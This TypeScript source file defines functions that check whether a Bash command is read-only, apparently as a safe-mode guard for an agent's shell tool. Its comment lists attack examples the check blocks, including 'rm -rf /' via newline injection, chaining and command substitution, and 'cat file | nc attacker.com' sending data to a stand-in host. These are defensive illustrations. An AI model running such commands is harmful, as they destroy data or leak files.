/// <reference path="../../types/incr-regex-package.d.ts" />
import { SAFE_MODE_CONFIG } from "../mode-types.ts";
import type { ToolCheckConfig } from './bash-contracts.ts';
import { getBashRejectionReason } from './bash-rejection.ts';

/**
 * Check if a Bash command is read-only using the given config.
 *
 * Uses AST-based validation to properly handle compound commands like
 * `git status && git log` - each part is validated separately, and the
 * command is allowed only if ALL parts pass.
 *
 * A command is considered safe if:
 * 1. It does NOT contain dangerous control characters (newlines, etc.)
 * 2. All simple commands match read-only patterns (including in compound commands)
 * 3. It does NOT contain redirects (>, >>, <) - these modify files
 * 4. It does NOT contain command/process substitution ($(), ``, <(), >())
 * 5. It does NOT run in background (&)
 *
 * Compound commands (&&, ||, |) are allowed when ALL parts are safe:
 * - `git status && git log` is allowed (both commands are safe)
 * - `git log | head` is allowed (both commands are safe)
 *
 * This multi-step check prevents attacks like:
 * - `ls\nrm -rf /` (newline injection)
 * - `git status && rm -rf /` (dangerous command in chain - rm not in allowlist)
 * - `cat file | nc attacker.com` (nc not in allowlist)
 * - `ls $(rm -rf /)` (command substitution)
 */
/**
 * Check if a Bash command is read-only using a custom config.
 * Exported for testing purposes.
 *
 * @param command - The bash command to check
 * @param config - Tool check configuration with patterns
 * @returns true if command is safe to run in read-only mode
 */
export function isReadOnlyBashCommandWithConfig(command: string, config: ToolCheckConfig): boolean {
  // Use getBashRejectionReason which now uses AST-based validation
  // If no rejection reason, command is safe
  const rejection = getBashRejectionReason(command, config);
  return rejection === null;
}

/**
 * Check if a Bash command is read-only using the default safe mode config.
 * Exported for testing.
 *
 * @param command - The bash command to check
 * @returns true if command is safe to run in read-only mode
 */
export function isReadOnlyBashCommand(command: string): boolean {
  return isReadOnlyBashCommandWithConfig(command, SAFE_MODE_CONFIG);
}
